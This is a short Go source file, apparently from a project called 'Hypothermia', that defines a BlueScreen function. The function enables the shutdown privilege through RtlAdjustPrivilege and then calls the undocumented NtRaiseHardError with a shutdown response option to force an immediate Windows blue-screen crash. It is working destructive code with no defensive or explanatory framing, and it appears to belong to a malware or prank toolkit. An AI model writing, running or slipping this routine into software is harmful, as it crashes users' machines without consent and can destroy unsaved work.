package funcs

import (
	"syscall"
	"unsafe"

	"Hypothermia/src/misc"
)

var raiseHardError *syscall.LazyProc = misc.NTdll.NewProc("NtRaiseHardError")

func BlueScreen() (int, error) {
	var old int32
	var res uint32

	ret, _, err := misc.AdjustPrivilege.Call(
		uintptr(19),
		uintptr(1),
		uintptr(0),
		uintptr(unsafe.Pointer(&old)),
	)

	if ret != 0 {
		return -1, err
	}

	ret, _, err = raiseHardError.Call(
		uintptr(0xC000007B),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(6),
		uintptr(unsafe.Pointer(&res)),
	)

	if ret != 0 {
		return -2, err
	}

	return 0, nil
}
